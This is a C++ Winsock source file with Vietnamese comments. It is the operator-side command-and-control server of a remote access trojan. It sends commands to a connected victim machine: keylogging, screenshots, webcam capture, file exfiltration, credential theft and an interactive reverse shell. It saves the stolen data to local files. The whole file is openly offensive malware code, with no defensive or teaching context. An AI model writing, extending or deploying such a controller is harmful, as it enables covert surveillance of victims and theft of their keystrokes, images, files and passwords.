#include <winsock2.h>
#include <iostream>
#include <string>
#include <fstream>

#pragma comment(lib, "ws2_32.lib")

// Hàm nhận file từ client và lưu vào máy
void receiveFile(SOCKET clientSocket, const std::string& filename) {
    std::ofstream file(filename, std::ios::binary); // Mở file ở chế độ nhị phân
    char buffer[1024];
    int bytesReceived;
    while ((bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0)) > 0) {
        file.write(buffer, bytesReceived); // Ghi dữ liệu nhận được vào file
    }
    file.close();
}

int main() {
    // 1. Khởi động Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed.\n";
        return 1;
    }

    // 2. Tạo socket
    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket == INVALID_SOCKET) {
        std::cerr << "Socket creation failed.\n";
        WSACleanup();
        return 1;
    }

    // 3. Bind socket đến địa chỉ IP và cổng
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(8080); // Sử dụng cổng 8080
    serverAddr.sin_addr.s_addr = INADDR_ANY; // Lắng nghe trên tất cả các IP
    if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Bind failed.\n";
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    // 4. Lắng nghe kết nối
    if (listen(serverSocket, 5) == SOCKET_ERROR) {
        std::cerr << "Listen failed.\n";
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    std::cout << "Server is listening on port 8080...\n";

    // 5. Chấp nhận kết nối từ client
    SOCKET clientSocket = accept(serverSocket, NULL, NULL);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Accept failed.\n";
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    std::cout << "Client connected.\n";

    // 6. Vòng lặp gửi lệnh và nhận dữ liệu
    while (true) {
        std::string command;
        std::cout << "Enter command (KEYLOG, SCREENSHOT, WEBCAM, FILE_EXFIL <pattern>, REVERSE_SHELL, CREDENTIALS, EXIT): ";
        std::getline(std::cin, command); // Nhập lệnh từ người dùng

        if (command == "EXIT") {
            send(clientSocket, command.c_str(), command.size(), 0);
            break; // Thoát vòng lặp nếu lệnh là EXIT
        }

        // Gửi lệnh đến client
        send(clientSocket, command.c_str(), command.size(), 0);

        // Xử lý dữ liệu nhận được từ client dựa trên lệnh
        if (command == "KEYLOG") {
            receiveFile(clientSocket, "received_keylog.txt");
            std::cout << "Received keylog saved as received_keylog.txt\n";
        } 
        else if (command == "SCREENSHOT") {
            receiveFile(clientSocket, "received_screenshot.bmp");
            std::cout << "Received screenshot saved as received_screenshot.bmp\n";
        } 
        else if (command == "WEBCAM") {
            receiveFile(clientSocket, "received_webcam.jpg");
            std::cout << "Received webcam image saved as received_webcam.jpg\n";
        } 
        else if (command.find("FILE_EXFIL") == 0) {
            receiveFile(clientSocket, "received_files.zip");
            std::cout << "Received files saved as received_files.zip\n";
        } 
        else if (command == "CREDENTIALS") {
            receiveFile(clientSocket, "received_credentials.txt");
            std::cout << "Received credentials saved as received_credentials.txt\n";
        } 
        else if (command == "REVERSE_SHELL") {
            // Xử lý reverse shell
            while (true) {
                std::string shellCommand;
                std::cout << "Shell> ";
                std::getline(std::cin, shellCommand); // Nhập lệnh shell
                if (shellCommand == "exit") break; // Thoát shell
                send(clientSocket, shellCommand.c_str(), shellCommand.size(), 0);
                char buffer[1024];
                int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
                if (bytesReceived > 0) {
                    buffer[bytesReceived] = '\0';
                    std::cout << buffer << std::endl; // In kết quả từ client
                }
            }
        }
    }

    // 7. Đóng kết nối
    closesocket(clientSocket);
    closesocket(serverSocket);
    WSACleanup();
    std::cout << "Server shut down.\n";
    return 0;
}